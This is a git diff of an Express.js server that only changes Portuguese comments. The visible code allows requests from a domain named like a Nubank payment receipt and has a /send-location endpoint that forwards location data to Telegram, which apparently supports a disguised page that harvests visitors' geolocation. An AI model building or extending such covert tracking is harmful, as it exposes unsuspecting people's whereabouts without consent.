@@ -6,7 +6,6 @@ const axios = require("axios");
 const app = express();
 
 // Configuração do CORS para permitir requisições do domínio específico
-// Durante o desenvolvimento, pode ser interessante permitir todas as origens
 app.use(cors({
   origin: 'https://comprovantenubank.vercel.app', // Alterado para o domínio de produção
   methods: ['GET', 'POST'],
@@ -41,6 +40,7 @@ app.post("/send-location", async (req, res) => {
     if (response.data.ok) {
       return res.status(200).json({ success: true, message: "Localização enviada com sucesso para o Telegram." });
     } else {
+      // Se a resposta do Telegram não for bem-sucedida, retorne erro
       return res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
     }
   } catch (error) {
